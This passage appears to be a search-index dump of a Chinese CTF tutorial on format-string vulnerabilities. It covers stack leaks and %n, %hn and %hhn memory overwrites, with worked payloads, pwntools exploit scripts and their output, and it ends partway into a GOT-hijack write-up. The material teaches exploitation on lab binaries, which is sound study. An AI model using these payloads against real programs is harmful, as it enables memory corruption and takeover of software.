\u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002 \u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570 \u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) \u8986\u76d6\u6808\u5185\u5b58 \u786e\u5b9a\u8986\u76d6\u5730\u5740 \u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002 \u786e\u5b9a\u76f8\u5bf9\u504f\u79fb \u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002 \u8fdb\u884c\u8986\u76d6 \u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_1","text":"\u9605\u8bfb ctf-wiki \u540e\u603b\u7ed3","title":"\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u5229\u7528"},{"location":"fmtstr/fmtstr_exploit/#_2","text":"\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u83b7\u53d6\u6211\u4eec\u6240\u60f3\u8981\u8f93\u51fa\u7684\u5185\u5bb9\u3002\u4e00\u822c\u4f1a\u6709\u5982\u4e0b\u51e0\u79cd\u64cd\u4f5c \u6cc4\u9732\u6808\u5185\u5b58 \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u7684\u503c \u83b7\u53d6\u67d0\u4e2a\u53d8\u91cf\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5b58 \u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58 \u5229\u7528 GOT \u8868\u5f97\u5230 libc \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6 libc\uff0c\u8fdb\u800c\u83b7\u53d6\u5176\u5b83 libc \u51fd\u6570\u5730\u5740 \u76f2\u6253\uff0cdump \u6574\u4e2a\u7a0b\u5e8f\uff0c\u83b7\u53d6\u6709\u7528\u4fe1\u606f\u3002","title":"\u6cc4\u9732\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_3","text":"\u4f8b\u5982\uff0c\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f #include <stdio.h> # file:leakmemory.c int main() { char s[100]; int a = 1, b = 0x22222222, c = -1; scanf(\"%s\", s); printf(\"%08x.%08x.%08x.%s\\n\", a, b, c, s); printf(s); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e return 0; } 32 \u4f4d\u7a0b\u5e8f\u4f7f\u7528\u7684\u662f\u6808\u4f20\u53c2\uff0c64 \u4f4d\u7cfb\u7edf\u524d 7 \u4e2a\u53c2\u6570\u662f\u7528\u5bc4\u5b58\u5668\u4f20\u53c2\u300232 \u4f4d\u7a0b\u5e8f\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u51fa\u5b58\u5728\u6808\u4e0a\u7684\u53c2\u6570\u3002\uff0864 \u4f4d\u8981\u5bf9\u5e94\u8c03\u6574\uff09 \u7f16\u8bd1 32 \u4f4d\u7a0b\u5e8f\uff1a gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c \u8f93\u5165\u8f93\u51fa\u5982\u4e0b\uff1a >>>%p.%p.%p 00000001.22222222.ffffffff.%p.%p.%p 0xffffcd10.0xc2.0xf7e8b6bb \u6808\u60c5\u51b5\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffccfc', 'l8'] 8 0xffffccfc\u2502+0x00: 0x080484ce \u2192 <main+99> add esp, 0x10 \u2190 $esp 0xffffcd00\u2502+0x04: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" # \u5f00\u59cb\u6cc4\u9732\u4f4d\u7f6e 0xffffcd04\u2502+0x08: 0xffffcd10 \u2192 \"%08x.%08x.%08x\" 0xffffcd08\u2502+0x0c: 0x000000c2 0xffffcd0c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd10\u2502+0x14: \"%08x.%08x.%08x\" \u2190 $eax 0xffffcd14\u2502+0x18: \".%08x.%08x\" 0xffffcd18\u2502+0x1c: \"x.%08x\"","title":"\u7b80\u5355\u7684\u6cc4\u9732\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_4","text":"\u4e0a\u9762\u5df2\u7ecf\u5b9e\u73b0\u4f9d\u6b21\u83b7\u53d6\u6808\u4e2d\u7684\u6bcf\u4e2a\u53c2\u6570\uff0c\u901a\u8fc7\u50cf\u4e0b\u9762\u8fd9\u6837\u6784\u9020\uff0c\u76f4\u63a5\u83b7\u53d6\u6307\u5b9a\u4e3a\u4f4d\u7f6e\u7684\u53c2\u6570\uff1a # \u7b2cn\u4e2a\u53c2\u6570 %n$p \u53ea\u8981\u77e5\u9053\u76ee\u6807\u6570\u636e\u5728\u6808\u4e0a\u7684\u504f\u79fb n \uff0c\u5c31\u80fd\u591f\u83b7\u53d6\u3002","title":"\u6cc4\u9732\u4efb\u610f\u5730\u5740\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_5","text":"","title":"\u5c0f\u603b\u7ed3"},{"location":"fmtstr/fmtstr_exploit/#_6","text":"\u7406\u8bba\u4e0a\u4efb\u4f55\u6808\u4e0a\u6570\u636e\u90fd\u80fd\u88ab\u6cc4\u9732\u51fa\u6765\uff0c\u76ee\u524d\u9047\u5230\u8fc7\u7684\u6709\u4ee5\u4e0b\u8fd9\u4e9b\uff1a Canary \u6cc4\u9732\u51fa Canary \u7684\u503c\uff0c\u4ece\u800c\u7ed5\u8fc7 Canary \u4fdd\u62a4\u3002 text \u6bb5\u5730\u5740 \u6cc4\u9732\u51fa text \u6bb5\u7684\u771f\u5b9e\u5730\u5740\uff0c\u4ece\u800c\u7ed5\u8fc7 PIE \u5bf9\u4e8e text \u6bb5\u7684\u4fdd\u62a4\uff0c\u4e3a ROP \u5b9e\u73b0\u63d0\u4f9b\u57fa\u7840\u3002 libc \u51fd\u6570\u5730\u5740 \u6cc4\u9732 libc \u51fd\u6570\u5730\u5740\uff0c\u83b7\u53d6 libc base addr \u3002\u8fd9\u91cc\u4e5f\u53ef\u4ee5\u7528\u6765\u662f\u7ed5\u8fc7 PIE \u4fdd\u62a4\uff0c\u4f46\u6cc4\u9732 libc \u5730\u5740\u610f\u4e49\u4e0d\u6b62\u4e8e\u6b64\u3002 \u67d0\u4e9b\u53d8\u91cf \u6709\u4e9b\u9898\u76ee\u4f1a\u6709 if \u5224\u65ad\u8f93\u5165\u503c\u7b49\u662f\u5426\u4e0e\u9884\u5148\u8bbe\u5b9a\u7684\u503c\u76f8\u7b49\uff0c\u4ee5\u6b64\u589e\u52a0\u96be\u5ea6\u3002","title":"\u4f1a\u7528\u6765\u6cc4\u9732\u4ec0\u4e48"},{"location":"fmtstr/fmtstr_exploit/#_7","text":"\u5229\u7528 %x \u6765\u83b7\u53d6\u5bf9\u5e94\u6808\u7684\u5185\u5b58\uff0c\u4f46\u5efa\u8bae\u4f7f\u7528 %p\uff0c\u53ef\u4ee5\u4e0d\u7528\u8003\u8651\u4f4d\u6570\u7684\u533a\u522b\u3002 \u5229\u7528 %s \u6765\u83b7\u53d6\u53d8\u91cf\u6240\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\uff0c\u53ea\u4e0d\u8fc7\u6709\u96f6\u622a\u65ad\u3002 \u5229\u7528 %order$x \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u7684\u503c\uff0c\u5229\u7528 %order$s \u6765\u83b7\u53d6\u6307\u5b9a\u53c2\u6570\u5bf9\u5e94\u5730\u5740\u7684\u5185\u5bb9\u3002","title":"\u5173\u952e\u5b57\u9009\u62e9"},{"location":"fmtstr/fmtstr_exploit/#_8","text":"\u8986\u76d6\u5185\u5b58\u4f7f\u7528\u7684 %n \u548c %c \u914d\u5408\u5b9e\u73b0\u3002 c \u7b80\u5355\u70b9\u6765\u8bf4\u5c31\u662f\u4ea7\u751f\u51e0\u4e2a null \u5b57\u7b26\u3002 n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u5c06\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002 \u5199\u5165\u7684\u65f6\u5019\u4e5f\u6709\u591a\u79cd\u65b9\u5f0f\uff1a n\uff1aint hn\uff1ashort int \u5199\u5165\u53cc\u5b57\u8282 hhn\uff1achar int \u5199\u5165\u5355\u5b57\u8282 \u7ed9\u51fa\u5982\u4e0b\u7684\u7a0b\u5e8f\u6765\u4ecb\u7ecd\u76f8\u5e94\u7684\u90e8\u5206\uff0832\u4f4d\uff09\uff1a /* example/overflow/overflow.c */ #include <stdio.h> int a = 123, b = 456; int main() { int c = 789; char s[100]; printf(\"%p\\n\", &c); scanf(\"%s\", s); printf(s); if (c == 16) { puts(\"modified c.\"); } else if (a == 2) { puts(\"modified a for a small number.\"); } else if (b == 0x12345678) { puts(\"modified b for a big number!\"); } return 0; }","title":"\u8986\u76d6\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_9","text":"","title":"\u8986\u76d6\u4efb\u610f\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_10","text":"\u8fd9\u91cc\u4ee5\u5c06 a \u8986\u76d6\u4e3a 2 \u4e3a\u4f8b\u3002\u9700\u8981\u5c06\u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u540e\u7f6e\uff0c\u56e0\u4e3a\u673a\u5668\u5b57\u957f\u4e3a 4 \uff0864 \u4f4d\u662f 8\uff09\u3002 \u6784\u9020\u5b57\u7b26\u4e32\u5982\u4e0b\uff1a aa%k$nxx[addr] aa \u4e24\u4e2a\u53ef\u89c1\u5b57\u7b26\uff0c\u6240\u4ee5\u6700\u540e\u4f1a\u5411\u76ee\u6807\u5730\u5740\u5199\u5165 2 \u3002 k \u76ee\u6807\u5730\u5740\u7684\u504f\u79fb\u4f4d\u7f6e\u3002 xx \u8ba9\u5b57\u7b26\u4e32\u5bf9\u5176\u673a\u5668\u5b57\u957f\uff0c\u8fd9\u91cc\u662f 4 \u3002 [addr] \u8986\u76d6\u7684\u76ee\u6807\u5730\u5740\u3002","title":"\u8986\u76d6\u5c0f\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#_11","text":"\u5bf9\u9f50\u65b9\u6cd5\u5728 32 64 \u7a0b\u5e8f\u4e2d\uff0c\u8986\u76d6\u5927\u6570\u5b57\u3001\u5c0f\u6570\u5b57\u4e2d\u90fd\u901a\u7528\uff0c\u4ee5\u4e0a\u9762\u8fd9\u4e2a\u4e3a\u4f8b\u3002python \u4f7f\u7528 len \u8ba1\u7b97\u957f\u5ea6\u540e\uff0c\u7528\u673a\u5668\u5b57\u957f\u53d6\u4f59\uff0c\u4f59\u6570\u5c31\u662f\u5bf9\u9f50\u957f\u5ea6\u3002 # 32\u4f4d\u673a\u5668\u5b57\u957f\uff1a4 # 64\u4f4d\u673a\u5668\u5b57\u957f\uff1a8 >>> len(\"aa%k$n\")%4 2 \u7b2c\u4e00\u4e2a\u53ef\u63a7\u5b57\u7b26\u504f\u79fb\u662f 6 \uff0c aa%k$nxx \u957f\u5ea6\u4e3a 8 \uff08\u4e0d\u4f1a\u7b97\u5c31 python len\uff09\uff0c\u6240\u4ee5 k \u504f\u79fb\u5e94\u8be5\u662f 8 \u3002 \u6784\u9020\u8986\u76d6\u5c0f\u6570\u5b57\u5229\u7528\u4ee3\u7801\uff1a def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() \u5bf9\u5e94\u7684\u7ed3\u679c\u5982\u4e0b >>>python exploit.py 0xffc1729c aaaa$\\xa0\\x0modified a for a small number.","title":"\u600e\u4e48\u5bf9\u9f50"},{"location":"fmtstr/fmtstr_exploit/#_12","text":"\u8986\u76d6\u57fa\u672c\u7ed3\u6784\u548c\u4e0a\u9762\u5dee\u4e0d\u591a\uff0c\u533a\u522b\u662f\u901a\u5e38\u662f\u8986\u76d6\u5927\u6570\u5b57\u4f1a\u5206\u6b21\u8986\u76d6\uff0c\u907f\u514d\u4e00\u4e0b\u6570\u636e\u592a\u5927\u800c\u4e0d\u6210\u529f\uff0c\u6240\u4ee5\u4f1a\u7528\u5230\u6807\u5fd7 hhn \u6216 hn \u3002 \u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u4f8b\u9898\uff0c\u5199\u5165\u7684\u76ee\u6807\u5730\u5740\u4e3a 0x0804A028 \u3002\u4f7f\u7528\u5355\u5b57\u8282\u5199\u5165\uff08hhn\uff09\uff0c\u5199\u5165\u503c\u4e3a 0x12345678 \u3002\u53d8\u91cf\u662f\u5c0f\u7aef\u5e8f\u5b58\u50a8\uff0c\u4e5f\u5728\u5185\u5b58\u4e2d\u662f\u8fd9\u6837\u7684\uff1a \\x78\\x56\\x34\\x12 \uff0c\u7b80\u5355\u70b9\u5c31\u662f\u4ece\u53f3\u5411\u5de6\u8986\u76d6\u3002 0x0804A028 \\x78 0x0804A029 \\x56 0x0804A02a \\x34 0x0804A02b \\x12 \u4e3a\u4e86\u4e0e\u8986\u76d6\u5c0f\u6570\u5b57\u7edf\u4e00\uff0c\u907f\u514d\u8ba1\u7b97\u5730\u5740\u5360\u7528\u5b57\u957f\uff0c\u5c06\u5730\u5740\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\uff0c\u5f97\u51fa\u4ee5\u4e0b\u6846\u67b6\uff1a # \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload=\"%xc%y$hhn%xc%y$hhn%xc%y$hhn%xc%y$hhn\" # \u76ee\u6807\u5730\u5740 payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3) x \u63a7\u5236\u8f93\u51fa\u591a\u5c11\u4e2a null \u5b57\u7b26\u3002 y \u5199\u5165\u5730\u5740\u7684\u504f\u79fb\u91cf\u3002","title":"\u8986\u76d6\u5927\u6570\u5b57"},{"location":"fmtstr/fmtstr_exploit/#c","text":"\u5199\u5165\u987a\u5e8f\u4e3a\uff1a0x78\u30010x56\u30010x34\u30010x12 \u9700\u8981\u5199\u51650x78\uff0c\u5df2\u7ecf\u5b58\u50a80x0\u5b57\u7b26 0x78=120 x1=120 --- \u9700\u8981\u5199\u51650x56\uff0c\u5df2\u7ecf\u5b58\u50a80x78\u5b57\u7b26 0x156\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x56 0x156-0x78=222 x2=222 --- \u9700\u8981\u5199\u51650x34\uff0c\u5df2\u7ecf\u5b58\u50a80x156\u5b57\u7b26 0x234\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x34 0x234-0x156=222 x3=222 --- \u9700\u8981\u5199\u51650x12\uff0c\u5df2\u7ecf\u5b58\u50a80x234\u5b57\u7b26 0x312\u6ea2\u51fa\u5355\u5b57\u8282\u4e0a\u9650\uff0c\u5ffd\u7565\u8fdb\u4f4d\uff0c\u5b58\u50a80x12 0x312-0x234=222 x4=222 --- \u5f97\u5230\u7ed3\u679c\uff1a payload=\"%120c%y$hhn%222c%y$hhn%222c%y$hhn%222c%y$hhn\" \uff0c\u957f\u5ea6\u662f 44 \uff0c\u9884\u4f30\u5730\u5740\u504f\u79fb\u662f\u4e24\u4f4d\u6570\u5b57\uff0c\u518d\u8fdb\u884c\u4e00\u4e0b\u4fee\u6539\uff0c\u8ba1\u7b97\u5bf9\u9f50\u957f\u5ea6\u4e3a 0 \uff0c\u6700\u540e payload \u4e3a\uff1a payload=\"%120c%18$hhn%222c%19$hhn%222c%20$hhn%222c%21$hhn\" payload += p32(0x0804A028)+p32(0x0804A028+1)+p32(0x0804A028+2)+p32(0x0804A028+3)","title":"\u624b\u5de5\u8ba1\u7b97 c \u751f\u6210\u5b57\u7b26\u6570"},{"location":"fmtstr/fmtstr_exploit/#_13","text":"","title":"\u8986\u76d6\u6808\u5185\u5b58"},{"location":"fmtstr/fmtstr_exploit/#_14","text":"\u8986\u76d6\u90a3\u91cc\u5185\u5bb9\u90fd\u597d\uff0c\u8986\u76d6\u5730\u5740\u80af\u5b9a\u8981\u660e\u786e\u7684\uff0c\u8986\u76d6\u6808\u4e0a\u53d8\u91cf\u4e5f\u662f\u9700\u8981\u7684\u3002\u53d8\u91cf\u5730\u5740\u4e00\u822c\u4f1a\u5b58\u653e\u5728\u6808\u4e0a\uff0c\u6211\u4eec\u5c31\u9700\u8981\u627e\u5230\u6808\u5b58\u653e\u8fd9\u4e2a\u53d8\u91cf\u5730\u5740\u7684\u504f\u79fb\u3002","title":"\u786e\u5b9a\u8986\u76d6\u5730\u5740"},{"location":"fmtstr/fmtstr_exploit/#_15","text":"\u8c03\u8bd5\u5728 printf \u6253\u65ad\u70b9\uff1a \u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 ['0xffffcd0c', 'l8'] 8 0xffffcd0c\u2502+0x00: 0x080484d7 \u2192 <main+76> add esp, 0x10 \u2190 $esp 0xffffcd10\u2502+0x04: 0xffffcd28 \u2192 \"%d%d\" 0xffffcd14\u2502+0x08: 0xffffcd8c \u2192 0x00000315 0xffffcd18\u2502+0x0c: 0x000000c2 0xffffcd1c\u2502+0x10: 0xf7e8b6bb \u2192 <handle_intel+107> add esp, 0x10 0xffffcd20\u2502+0x14: 0xffffcd4e \u2192 0xffff0000 \u2192 0x00000000 0xffffcd24\u2502+0x18: 0xffffce4c \u2192 0xffffd07a \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" 0xffffcd28\u2502+0x1c: \"%d%d\" \u2190 $eax \u5728 0xffffcd14 \u5904\u5b58\u50a8\u7740\u53d8\u91cf c \u7684\u5730\u5740\u3002\u504f\u79fb\u91cf\u4e3a 6 \u3002","title":"\u786e\u5b9a\u76f8\u5bf9\u504f\u79fb"},{"location":"fmtstr/fmtstr_exploit/#_16","text":"\u8fd9\u6837\uff0c\u7b2c 6 \u4e2a\u53c2\u6570\u5904\u7684\u503c\u5c31\u662f\u5b58\u50a8\u53d8\u91cf c \u7684\u5730\u5740\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528 %n \u7684\u7279\u5f81\u6765\u4fee\u6539 c \u7684\u503c\u3002payload \u5982\u4e0b [addr of c]%012d%6$n addr of c \u7684\u957f\u5ea6\u4e3a 4\uff0c\u6545\u800c\u6211\u4eec\u5f97\u518d\u8f93\u5165 12 \u4e2a\u5b57\u7b26\u624d\u53ef\u4ee5\u8fbe\u5230 16 \u4e2a\u5b57\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u6765\u4fee\u6539 c \u7684\u503c\u4e3a 16\u3002 \u5177\u4f53\u811a\u672c\u5982\u4e0b def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive() forc() \u7ed3\u679c\u5982\u4e0b \u279c overwrite git:(master) \u2717 python exploit.py [+] Starting local process './overwrite': pid 74806 0xfffd8cdc \u070c\ufffd\ufffd%012d%6$n \u070c\ufffd\ufffd-00000160648modified c.","title":"\u8fdb\u884c\u8986\u76d6"},{"location":"fmtstr/example/fmtstr_example/hijack_GOT/2016_CCTF_pwn3_writeup/","text":"2016 CCTF pwn3 \u8003\u70b9\uff1a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001hijack GOT\u3001\u5806 \u5206\u6790 \u4fdd\u62a4\u60c5\u51b5 32 \u4f4d\u52a8\u6001\u94fe\u63a5\uff1b\u6253\u5f00 NX \uff1bRELRO \u90e8\u5206\u4fdd\u62a4\uff0c\u53ef\u4ee5\u6539 GOT \u8868\u5730\u5740 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u6f0f\u6d1e\u51fd\u6570 \u7a0b\u5e8f\u5b9e\u73b0\u7684\u8f93\u51fa\u529f\u80fd\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002\u51fd\u6570\u5c06\u5185\u5bb9\u5199\u5165\u5230 dest \u4e2d\uff0c\u5728\u7528 printf \u8f93\u51fa\uff0c\u800c dest \u5185\u5bb9\u662f\u53ef\u63a7\u7684\u3002 int get_file() { char dest; // [esp+1Ch] [ebp-FCh] char s1; // [esp+E4h] [ebp-34h] char *i; // [esp+10Ch] [ebp-Ch] printf(\"enter the file name you want to get:\"); __isoc99_scanf(\"%40s\", &s1); if ( !strncmp(&s1, \"flag\", 4u) ) puts(\"too young, too simple\"); for ( i = (char *)file_head; i; i = (char *)*((_DWORD *)i + 60) ) { if ( !strcmp(i, &s1) ) { strcpy(&dest, i + 40); return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } } return printf(&dest);//\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 } \u601d\u8def \u6574\u4f53\u653b\u51fb\u5de5\u7a0b\uff1a \u7ed5\u8fc7\u5bc6\u7801 \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u5229\u7528 put@got \u83b7\u53d6 put \u51fd\u6570\u5730\u5740\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94\u7684 libc.so \u7684\u7248\u672c\uff0c\u8fdb\u800c\u83b7\u53d6\u5bf9\u5e94 system \u51fd\u6570\u5730\u5740\u3002 \u4fee\u6539 puts@got \u7684\u5185\u5bb9\u4e3a system \u7684\u5730\u5740\u3002 \u5f53\u7a0b\u5e8f\u518d\u6b21\u6267\u884c puts \u51fd\u6570\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u6267\u884c\u7684\u662f system \u51fd\u6570\u3002 \u7ed5\u8fc7\u5bc6\u7801 \u7b80\u5355\u79fb\u4f4d\u5bc6\u7801\uff0c\u79fb\u52a8\u4f4d\u6570\u662f 1 \u3002\u5bc6\u6587\u662f\uff1a sysbdmin \uff0c\u5bf9\u5e94\u660e\u6587\u662f\uff1a rxraclhm \u3002 __isoc99_scanf(\"%40s\", src); for ( i = 0; i <= 39 && src[i]; ++i ) ++src[i]; \u786e\u5b9a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u53c2\u6570\u504f\u79fb \u6211\u8fd8\u662f\u4f7f\u7528\u81ea\u5df1\u719f\u6089\u7684\u65b9\u6cd5\u6cc4\u9732\u51fa\u5730\u5740\uff08\u5199\u4e00\u5806%p\uff09\uff0c\u61d2\u5f97\u8ba1\u7b97\uff0c\u504f\u79fb\u4e3a 7 \uff1a \u6cc4\u9732 libc \u5730\u5740 content \u662f\u5b58\u5728\u5806\u4e2d\u7684\uff0c\u4e0d\u662f\u6808\u4e0a\u7684\uff0c\u4e5f\u5c31\u641e\u4e0d\u5230\u6808\u4e0a\u7684 libc \u51fd\u6570\u5730\u5740\uff0c\u4f46\u662f\u5806\u4e2d\u5185\u5bb9\u662f\u53ef\u63a7\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u5f80\u91cc\u9762\u5199\u5165 libc \u51fd\u6570\u5730\u5740\uff0c\u7136\u540e\u5728\u8bfb\u51fa\u6765\u5c31\u884c\u4e86\u3002 payload = \"%8$s\" + p32(puts_got) creat('aaaa',payload) 